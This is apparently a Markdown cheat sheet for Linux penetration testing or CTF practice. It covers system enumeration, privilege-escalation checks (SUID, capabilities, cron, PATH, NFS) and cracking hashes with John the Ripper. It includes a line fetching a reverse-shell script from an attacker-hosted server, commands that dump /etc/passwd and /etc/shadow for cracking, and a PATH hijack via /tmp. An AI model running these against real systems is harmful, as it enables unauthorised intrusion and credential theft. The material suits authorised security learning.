# Intrusion phase (Linux)

## Enumeration

```sh
ls -la
ls -l /home
```

```sh
hostname
hostname -A
uname -a
```

```sh
cat /proc/version
cat /etc/issue
```

```sh
# View all running processes
ps -A
# View process tree
ps axjf
# Show processes for all users
ps aux
```

```sh
# environmental variables
env
# path variables
echo $PATH
```

```sh
# list sudoer commands
sudo -l -l
```

```sh
id
cat /etc/passwd
```

```sh
history
# network interfaces
ifconfig
# which network routes exist
ip route
```

```sh
# list open TCP ports
netstat -at
# list open UDP ports
netstat -au
# list listening ports
netstat -l
# list network usage statistics by protocol
netstat -s
# show interface statistics
netstat -i
```

```sh
# find "flag" in the current directory
find . -name *flag*.txt -type f 2>/dev/null
# find "flag" in the home directory
find /home -name *flag*.txt -type f 2>/dev/null
# find the directory named "config"
find / -type d -name config -type f 2>/dev/null
# find files with the 777 permissions
find / -type f -perm 0777 -type f 2>/dev/null
# find executable files
find / -perm a=x -type f 2>/dev/null
# find files of user "frank" under home
find /home -user frank -type f 2>/dev/null
# find files last modified in 10 days
find / -mtime 10 -type f 2>/dev/null
# find files last accessed in 10 days
find / -atime 10 -type f 2>/dev/null
# find files last changed  in 10 days
find / -ctime 10 -type f 2>/dev/null
```

## Privilege Escalation

```sh
# find world-writeable folders
find / -perm -o w -type d 2>/dev/null
# find world-executable folders
find / -perm -o x -type d 2>/dev/null
# find development tools and supported languages:
find / -name perl* 2>/dev/null
find / -name python* 2>/dev/null
find / -name gcc* 2>/dev/null
```

```sh
# find files with the SUID bit
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm /4000 2>/dev/null
find / -type f -perm -04000 -ls 2>/dev/null
```

```sh
# list enabled capabilities
getcap -r / 2>/dev/null
```

## Enumeration Tools

+ https://github.com/carlospolop/PEASS-ng
+ https://github.com/rebootuser/LinEnum
+ https://github.com/mzet-/linux-exploit-suggester
+ https://github.com/linted/linuxprivchecker
+ https://github.com/diego-treitos/linux-smart-enumeration

## Can't create or write file ?

find writeable folder

```sh
find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
```

HTTP Server

```sh
python3 -m http.server
wget <my_ip>:8000/rev.sh
```

## SUID

+ https://gtfobins.github.io/#+suid
+ https://gtfobins.github.io/#+sudo

![image](https://user-images.githubusercontent.com/90561566/197326889-ffb67cf2-0c0c-4c80-b425-03fff624acdf.png)

## Cron job

expect for a scheduled task that runs with root privileges
 
```sh
cat /etc/crontab
```

![image](https://user-images.githubusercontent.com/90561566/197326870-96166c91-1afc-4172-bcc5-8ce135278adb.png)

## Chmod UID

```sh
# SetUID bit enforces user ownership on an executable file	
chmod u+s
# SetGID bit enforces group ownership on files and directories
chmod g+s
```

![image](https://user-images.githubusercontent.com/90561566/197327058-b574eddb-3946-4778-bd47-81b190745c95.png)

## Capatilities

```sh
getcap -r / 2>/dev/null
```

![image](https://user-images.githubusercontent.com/90561566/197326980-b0ec6b42-f263-4947-8e64-0a559fd18247.png)

## PATH

```sh
# add /tmp to PATH
export PATH=/tmp:$PATH
```

![image](https://user-images.githubusercontent.com/90561566/197327088-6be5f5bc-dc32-4655-be19-f96cda114e9a.png)

## NFS

```sh
cat /etc/exports
```

![image](https://user-images.githubusercontent.com/90561566/197327366-6cdda36d-0ba8-454f-899f-cb46e3e23f19.png)

enumerating mountable shares

```sh
showmount -e <ip>
```

## Cracking

### Hash identify

```sh
hash-identifier
# or haiti-hash
gem install haiti-hash
# or name-that-hash
pip3 install name-that-hash
```

### John the ripper

```sh
base64 /etc/passwd | base64 --decode | tail -n4
base64 /etc/shadow | base64 --decode | tail -n4
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
john --show passwords.txt
```

### Hashcat

![image](https://user-images.githubusercontent.com/90561566/197317015-c0da7766-cd5e-4423-abfd-962ba23860b1.png)











